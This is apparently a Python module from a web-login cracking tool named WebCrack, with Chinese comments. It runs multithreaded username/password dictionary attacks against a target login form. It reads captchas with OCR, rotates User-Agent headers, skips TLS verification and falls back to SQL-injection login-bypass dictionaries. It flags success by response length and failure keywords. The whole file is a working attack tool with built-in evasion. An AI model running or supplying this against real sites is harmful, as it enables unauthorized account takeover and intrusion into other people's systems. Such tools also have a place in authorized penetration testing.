#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
暴力破解模块 for WebCrack
处理核心暴力破解功能
"""

import requests
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import ddddocr
    DDDDOCR_AVAILABLE = True
except ImportError:
    DDDDOCR_AVAILABLE = False

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

from .page_parser import PageParser
from ..utils.dict_generator import generate_dictionary, generate_sql_injection_dict
from ..utils.logger import Info, Error, Success


def _get_response_length(response):
    """
    获取响应内容长度
    
    Args:
        response (requests.Response): HTTP响应
        
    Returns:
        int: 响应内容长度
    """
    return len(response.text)


class BruteForceTask:
    """WebCrack的暴力破解任务"""
    
    def __init__(self, config):
        """
        初始化暴力破解任务
        
        Args:
            config (dict): 配置字典
        """
        self.config = config
        self.requests_proxies = config["brute_force"]["requests_proxies"]
        self.timeout = config["brute_force"]["timeout"]
        self.fail_words = config["brute_force"]["fail_words"]
        self.test_username = config["brute_force"]["test_username"]
        self.test_password = config["brute_force"]["test_password"]
        self.delay = config["brute_force"]["delay"]
        
        # 任务数据
        self.task_id = 0
        self.url = ''
        self.parser = None
        self.error_length = 0
        self.session = None
        self.request_count = 0  # 添加请求计数器
        self.ua_change_interval = 200  # UA更换间隔
    
    def run(self, task_id, url):
        """
        运行暴力破解任务
        
        Args:
            task_id (int): 任务ID
            url (str): 目标URL
        """
        self.task_id = task_id
        self.url = url
        
        print("")
        from ..utils.logger import _logger
        if _logger:
            _logger.set_task_id(task_id)
            
        Info(f"[*] 开始检测: {url}")
        
        try:
            # 创建独立的会话对象
            self.session = requests.Session()
            
            # 解析页面
            self.parser = PageParser(self.url, self.config)
            if not self.parser.run():
                return False
            
            # 获取错误响应长度
            self.error_length = self._get_error_length()
            
            # 设置任务超时时间（3分钟）
            timeout_seconds = 180  # 3分钟 = 180秒
            
            # 使用线程池执行任务并设置超时
            with concurrent.futures.ThreadPoolExecutor(max_workers=1) as executor:
                future = executor.submit(self._run_attack)
                
                try:
                    result = future.result(timeout=timeout_seconds)
                    return result
                except concurrent.futures.TimeoutError:
                    Error(f"[-] 任务超时({timeout_seconds}秒)，跳过URL: {url}")
                    # 取消任务并清理资源
                    future.cancel()
                    self._cleanup()
                    return False
                
        except Exception as e:
            Error(f"{str(e)}")
            self._cleanup()
            return False
            
    def _run_attack(self):
        """执行暴力破解攻击的主要逻辑"""
        # 生成字典并开始暴力破解
        username_dict, password_dict = generate_dictionary(self.url, self.config)
        username, password = self._brute_force_task(username_dict, password_dict)
        
        # 如果常规破解失败，尝试SQL注入
        if not username and not password:
            # 检查此CMS或全局是否启用SQL注入
            if (self.parser.cms_info and self.parser.cms_info.get("sqlin_able")) or \
               self.config["dictionary"]["sql_injection"]["enabled"]:
                Info(f"[*] {self.url} 启动SQL注入暴力破解模块")
                sql_user_dict, sql_pass_dict = generate_sql_injection_dict(self.config)
                username, password = self._brute_force_task(sql_user_dict, sql_pass_dict)

        # 验证成功凭据
        if username and password:
            Info(f"[*] 重新验证... {self.url} {username} {password}")
            recheck_result = self._recheck(username, password)
            if recheck_result:
                Success(f"[+] 爆破成功: {self.url}  {username}/{password}")
                return True
            else:
                Info(f"[-] 重新验证失败: {self.url}  {username}/{password}")
                
        Error("[-] 爆破失败: " + self.url)
        return False
    
    def _cleanup(self):
        """清理资源"""
        if self.session:
            self.session.close()
            self.session = None
    
    def _brute_force_request(self, session, username, password):
        """
        发送暴力破解请求
        
        Args:
            session (requests.Session): HTTP会话
            username (str): 要测试的用户名
            password (str): 要测试的密码
            
        Returns:
            requests.Response: HTTP响应
        """
        from ..utils.header_generator import get_random_headers
        
        # 创建表单数据副本
        data = self.parser.form_data.copy()
        path = self.parser.post_path
        
        # 填入凭据
        data[self.parser.username_field] = username
        data[self.parser.password_field] = password
        
        # 如果启用验证码且存在输入框，则获取新验证码
        if (self.config["captcha"]["enabled"] and DDDDOCR_AVAILABLE and 
            self.parser.captcha_input_name):
            try:
                captcha_value = self._get_captcha_value()
                if captcha_value:
                    data[self.parser.captcha_input_name] = captcha_value
            except Exception as e:
                Error(f"获取验证码失败: {str(e)}")
        
        # 每200次请求更换一次User-Agent
        self.request_count += 1
        if self.request_count % self.ua_change_interval == 1:  # 第1, 201, 401...次请求时更换UA
            Info(f"[*] 第 {self.request_count} 次请求，更换User-Agent")
        
        try:
            res = session.post(
                url=path, 
                data=data, 
                headers=get_random_headers(self.config), 
                timeout=self.timeout, 
                verify=False,
                allow_redirects=True, 
                proxies=self.requests_proxies
            )
            time.sleep(self.delay)
            res.encoding = res.apparent_encoding
            return res
        except requests.exceptions.RequestException as e:
            Error(f"请求出错: {str(e)}")
            # 返回默认响应对象
            res = requests.Response()
            res.status_code = 500
            res._content = b""
            return res
    
    def _get_captcha_value(self):
        """
        获取新验证码值
        
        Returns:
            str: 验证码值或None
        """
        if not DDDDOCR_AVAILABLE:
            return None
            
        if hasattr(self.parser, 'captcha_img_url') and self.parser.captcha_img_url:
            try:
                Info(f"[*] 获取新验证码图片: {self.parser.captcha_img_url}")
                
                from ..utils.header_generator import get_random_headers
                
                # 下载验证码图片
                headers = get_random_headers(self.config)
                response = requests.get(
                    self.parser.captcha_img_url, 
                    headers=headers,
                    timeout=self.timeout, 
                    verify=False,
                    proxies=self.requests_proxies
                )
                
                if response.status_code == 200:
                    # 使用ddddocr识别验证码
                    ocr = ddddocr.DdddOcr()
                    captcha_text = ocr.classification(response.content)
                    Info(f"[*] 新验证码识别结果: {captcha_text}")
                    return captcha_text
                else:
                    Error(f"[-] 下载验证码图片失败，状态码: {response.status_code}")
            except Exception as e:
                Error(f"[-] 获取验证码失败: {str(e)}")
        return None
    
    def _get_error_length(self):
        """
        获取错误响应长度
        
        Returns:
            int: 错误响应长度
        """
        session = requests.session()
        self.session = session
        
        try:
            # 发送两次测试请求
            res1 = self._brute_force_request(session, self.test_username, self.test_password)
            res2 = self._brute_force_request(session, self.test_username, self.test_password)
            
            error_length1 = _get_response_length(res1)
            error_length2 = _get_response_length(res2)
            
            if error_length1 != error_length2:
                raise Exception(f"[-] {self.url} 错误长度不为固定值")
            return error_length1
        except Exception as e:
            raise Exception(f"获取错误长度失败: {str(e)}")
    
    def _recheck(self, username, password):
        """
        重新验证凭据
        
        Args:
            username (str): 用户名
            password (str): 密码
            
        Returns:
            bool: 凭据有效返回True，否则返回False
        """
        password = password.replace('{user}', username)
        session = requests.session()
        
        try:
            # 发送测试请求和实际请求
            res1 = self._brute_force_request(session, self.test_username, self.test_password)
            res2 = self._brute_force_request(session, username, password)
            
            error_length1 = _get_response_length(res1)
            error_length2 = _get_response_length(res2)

            # 检查长度是否不同或状态为403(禁止访问)
            if error_length1 == error_length2 or res2.status_code == 403:
                return False
            else:
                return True
        except Exception as e:
            Error(f"重新验证失败: {str(e)}")
            return False
    
    def _brute_force_task(self, username_dict, password_dict):
        """
        执行暴力破解任务
        
        Args:
            username_dict (list): 用户名字典
            password_dict (list): 密码字典
            
        Returns:
            tuple: 找到则返回(username, password)，否则返回(False, False)
        """
        # 从配置中获取多线程设置，避免用户交互
        max_workers = self.config.get("brute_force", {}).get("max_workers", 1)
        
        if max_workers > 1:
            Info(f"使用 {max_workers} 个线程进行 {self.url} 的暴力破解")
            return self._brute_force_task_threaded(username_dict, password_dict, max_workers)
        else:
            return self._brute_force_task_single_threaded(username_dict, password_dict)
    
    def _brute_force_task_single_threaded(self, username_dict, password_dict):
        """
        单线程暴力破解任务
        
        Args:
            username_dict (list): 用户名字典
            password_dict (list): 密码字典
            
        Returns:
            tuple: 找到则返回(username, password)，否则返回(False, False)
        """
        fail_words = self.fail_words
        session = self.session
        error_length = self.error_length
        total_attempts = len(username_dict) * len(password_dict)
        attempt_count = 0
        
        for username in username_dict:
            for password in password_dict:
                is_valid = True
                password = password.replace('{user}', username)
                attempt_count += 1
                
                Info(f"[*] {self.url} 进度: ({attempt_count}/{total_attempts}) 正在测试: {username} {password}")
                
                try:
                    res = self._brute_force_request(session, username, password)
                except Exception as e:
                    Error(f"发送请求失败: {str(e)}")
                    continue
                
                html = res.text + str(res.headers)
                
                # 检查CMS特定的成功/失败标志
                if self.parser.cms_info:
                    success_flag = self.parser.cms_info.get("success_flag")
                    die_flag = self.parser.cms_info.get("die_flag")
                    
                    if success_flag and (success_flag in html):
                        return username, password
                    elif die_flag and (die_flag in html):
                        return False, False
                
                # 检查失败关键字
                for fail_word in fail_words:
                    if fail_word in html:
                        is_valid = False
                        break
                
                # 如果未找到失败关键字，检查响应长度
                if is_valid:
                    current_length = _get_response_length(res)
                    # 如果响应中包含用户名/密码字段则跳过
                    if (self.parser.username_field in res.text and 
                        self.parser.password_field in res.text):
                        continue
                    # 检查长度是否与错误长度不同
                    if current_length != error_length:
                        return username, password
                else:
                    continue
                    
        return False, False
    
    def _brute_force_task_threaded(self, username_dict, password_dict, max_workers):
        """
        多线程暴力破解任务
        
        Args:
            username_dict (list): 用户名字典
            password_dict (list): 密码字典
            max_workers (int): 线程数
            
        Returns:
            tuple: 找到则返回(username, password)，否则返回(False, False)
        """
        fail_words = self.fail_words
        session = self.session
        error_length = self.error_length
        total_attempts = len(username_dict) * len(password_dict)
        attempt_count = 0
        found_credentials = [False, False]  # 用于存储找到的凭据
        
        # 线程安全的计数器
        attempt_counter_lock = threading.Lock()
        
        # 创建所有测试组合
        test_combinations = []
        for username in username_dict:
            for password in password_dict:
                test_combinations.append((username, password))
        
        def test_credential(username, password):
            nonlocal attempt_count
            # 线程安全地增加计数器
            with attempt_counter_lock:
                attempt_count += 1
                local_attempt_count = attempt_count
            
            password = password.replace('{user}', username)
            
            Info(f"[*] {self.url} 进度: ({local_attempt_count}/{total_attempts}) 正在测试: {username} {password}")
            
            try:
                res = self._brute_force_request(session, username, password)
            except Exception as e:
                Error(f"发送请求失败: {str(e)}")
                return None, None, False
            
            html = res.text + str(res.headers)
            
            # 检查CMS特定的成功/失败标志
            if self.parser.cms_info:
                success_flag = self.parser.cms_info.get("success_flag")
                die_flag = self.parser.cms_info.get("die_flag")
                
                if success_flag and (success_flag in html):
                    return username, password, True
                elif die_flag and (die_flag in html):
                    return None, None, True  # 停止信号
            
            # 检查失败关键字
            is_valid = True
            for fail_word in fail_words:
                if fail_word in html:
                    is_valid = False
                    break
            
            # 如果未找到失败关键字，检查响应长度
            if is_valid:
                current_length = _get_response_length(res)
                # 如果响应中包含用户名/密码字段则跳过
                if (self.parser.username_field in res.text and 
                    self.parser.password_field in res.text):
                    return None, None, False
                # 检查长度是否与错误长度不同
                if current_length != error_length:
                    return username, password, True
            
            return None, None, False
        
        # 使用线程池执行测试
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # 提交所有任务
            future_to_credential = {
                executor.submit(test_credential, username, password): (username, password)
                for username, password in test_combinations
            }
            
            # 处理完成的任务
            for future in as_completed(future_to_credential):
                username, password = future_to_credential[future]
                try:
                    result_username, result_password, stop_flag = future.result()
                    if result_username and result_password:
                        found_credentials = [result_username, result_password]
                        # 如果找到凭据，取消所有未完成的任务
                        for f in future_to_credential:
                            if not f.done():
                                f.cancel()
                        break
                    elif stop_flag:
                        # 如果收到停止信号，取消所有未完成的任务
                        for f in future_to_credential:
                            if not f.done():
                                f.cancel()
                        break
                except Exception as e:
                    Error(f"测试 {username}/{password} 时出错: {e}")
        
        return tuple(found_credentials)
